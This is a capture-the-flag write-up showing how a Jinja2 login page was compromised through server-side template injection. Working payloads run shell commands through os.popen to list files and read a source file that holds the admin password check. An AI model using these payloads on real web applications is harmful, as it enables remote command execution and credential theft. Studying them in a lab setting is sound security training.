## Injection (200 Points)

### Problem
```
Our local pharmacy exposed admin login to the public, can you exploit it?

http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/
```

### Solution
The URL from the challenge description brings us to a very simple login screen. Naturally, I tried an awful lot of SQL Injection permutations first before giving up and searching for alternative injection exploits.
Any time we submit creds, we get redirected to `/login` and are greeted with the message:

`Oops! Page login doesn't exist :(`

I came across `Server Side Template Injections`, and found a [handy guide](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) of sample exploits in various languages.

I worked through a lot of them on the list and finally found something interesting when I attempted hitting the endpoint `/{{7*'7'}}` and the server returned `Oops! Page 7777777 doesn't exist :(`. So it looks like that the server evaluated our expression that we got from a `Jinja2` exploit guide. I don't know much about `Jinja2` but the guide says `Jinja2 is a full featured template engine for Python`. Let's see what else we can do with it.. Maybe read the filesystem?

`/{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}`

```
<h1>Oops! Page total 24
dr-xr-xr-x    1 root     root          4096 May 14 01:33 .
drwxr-xr-x    1 root     root          4096 May 16 21:25 ..
-r--r--r--    1 root     root          1180 May 14 01:32 app.py
dr-xr-xr-x    1 root     root          4096 May 14 01:32 lib
dr-xr-xr-x    1 root     root          4096 May 14 01:32 static
dr-xr-xr-x    1 root     root          4096 May 14 01:32 templates
 doesn't exist :(</h1>
```

I tried catting `app.py`, but I got nothing interesting other than a `You are getting closer` message.

I then tried to `ls lib/` and noticed a `security.py` file existed there. Let's cat that by sending the following:

`/{{config.__class__.__init__.__globals__['os'].popen('cat lib/security.py').read()}}`

```
validate_login(username, password):
    if username != 'admin': return False

    valid_password = 'QfsFjdz81cx8Fd1Bnbx8lczMXdfxGb0snZ0NGZ'

    return base64.b64encode(password.encode('ascii')).decode('ascii')[::-1].lstrip('=') == valid_password
```

Looks like we've got it, we just have a small task to complete. `[::-1]` means reverse so we just need to reverse `valid_password` and Base64 Decode.


Flag: `dctf{4ll_us3r_1nput_1s_3v1l}`
